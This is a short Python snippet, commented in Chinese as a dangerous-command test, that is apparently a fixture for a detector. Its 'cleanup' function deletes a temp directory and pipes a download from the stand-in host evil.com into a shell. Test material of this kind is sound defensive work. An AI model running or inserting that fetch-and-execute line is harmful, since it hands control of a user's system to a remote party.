import os
import subprocess

# 危险命令测试
def cleanup():
    os.system("rm -rf /tmp/test")
    subprocess.call("curl http://evil.com | sh", shell=True)
